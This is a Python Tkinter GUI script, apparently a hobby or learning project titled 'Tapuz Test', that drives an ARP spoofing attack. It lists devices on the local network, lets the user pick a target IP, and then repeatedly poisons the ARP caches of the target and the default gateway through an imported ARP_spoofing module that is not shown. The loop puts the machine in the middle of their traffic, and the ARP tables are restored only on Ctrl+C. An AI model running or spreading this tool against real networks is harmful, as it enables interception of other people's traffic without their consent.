import tkinter as tk
from  tkinter import ttk
import ARP_spoofing
import FindGatewayIP
import time
import IPAddressList
import FindManufacturer


#test command1
def test():
    print('Hi, the test is working!')

#ARP spoofing command
def spoofing(target_IP):
    target_ip = target_IP
    gateway_ip = FindGatewayIP.get_default_gateway_ip()
    try:
        sent_packets_count = 0
        while(True):
            ARP_spoofing.spoof(target_ip, gateway_ip) 
            ARP_spoofing.spoof(gateway_ip, target_ip) 
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent "+str(sent_packets_count), end ="") 
            time.sleep(2) # Waits for two seconds 
    except KeyboardInterrupt: 
        print("\nCtrl + C pressed.............Exiting")
        ARP_spoofing.restore(gateway_ip,target_ip)
        ARP_spoofing.restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")

def get_selected_device_from_gui():
  # Create a list of items
  devices = IPAddressList.get_all_devices_on_network()

  # Variable to store the selected device
  selected_device = None

  # Function to handle listbox selection
  def on_select(event):
    global selected_device
    # Get the index of the selected item
    selected_index = listbox.curselection()[0]
    # If an item is selected, update the selected_device variable and print it
    if selected_index >= 0:
      selected_device = devices[selected_index]
      print(f"Selected device: {selected_device}")  # Print immediately
      return selected_device

  # Function to handle the selected device (**Optional, modify if needed**)
  def handle_selected_device():
    # You can add additional actions here if needed (e.g., storing the device)
    pass

  # Create the main window
  window = tk.Tk()

  # Set the window title
  window.title("Tapuz Test")

  # Set the window size
  window.geometry("900x420")  # Increased width

  # Set window and listbox background color
  window_bg = '#333'  # Assuming dark gray

  # Set neon green text color for listbox
  listbox_text_color = '#39FF14'  # Replace with your preferred neon green code

  # Create a label widget
  label = ttk.Label(window, text="Tapuz Test ARP spoofing")

  window.configure(bg=window_bg)  # Set window background color
  label.configure(foreground='white', background=window_bg)  # Set label text and background color

  # Pack the label widget into the window
  label.pack(pady=50)

  # Create listbox with scrollbar
  listbox = tk.Listbox(window, width=50)  # Increased width for listbox
  scrollbar = tk.Scrollbar(window, orient=tk.VERTICAL, command=listbox.yview)
  listbox.config(yscrollcommand=scrollbar.set)
  listbox.configure(bg=window_bg, fg=listbox_text_color)
  # Bind the on_select function to the listbox selection event
  listbox.bind('<<ListboxSelect>>', on_select)  # Corrected typo (<< instead of <)

  # Pack listbox and scrollbar
  listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
  scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

  # Add each item to the listbox
  for device in devices:
      listbox.insert(tk.END, device)

  # Run the main event loop (within the function)
  window.mainloop()

  # No return value needed in this approach (commented out)
  # return selected_device


def MainWindow():
    def Test():
        ip = ip_entry.get()
        print("IP Address:", ip)
        spoofing(ip)

    def pick_device():
       device = get_selected_device_from_gui()
       print("using pick_device()")
       print(f"IP Address: {device['ip']}, MAC Address: {device['mac']}")
       spoofing(device['ip'])



    window = tk.Tk()

    # Set the window title
    window.title("Tapuz Test")

    # Set the window size
    window.geometry("740x420")

    # Create a label widget
    label = ttk.Label(window, text="Tapuz Test ARP spoofing")

    window.configure(bg='#333')  # Set window background color
    label.configure(foreground='white', background='#333')  # Set label text and background color

    # Pack the label widget into the window
    label.pack(pady=50)

    # Create a label widget
    label = ttk.Label(window, text="Enter IP Address:")
    label.pack(pady=10)

    # Create an entry widget for the IP address
    ip_entry = ttk.Entry(window)
    ip_entry.pack(pady=10)

    # Create a button to run the Test function
    test_button = ttk.Button(window, text="Run Test", command=Test)

    # Pack the button widget into the window
    test_button.pack()

    select_button = ttk.Button(window, text="Pick Device", command=pick_device)
    select_button.pack()

    # Run the Tkinter event loop
    window.mainloop()


#MAIN starts here!
if __name__== "__main__":

    # Get the list of devices on the network
    devices = IPAddressList.get_all_devices_on_network()
    
    MainWindow()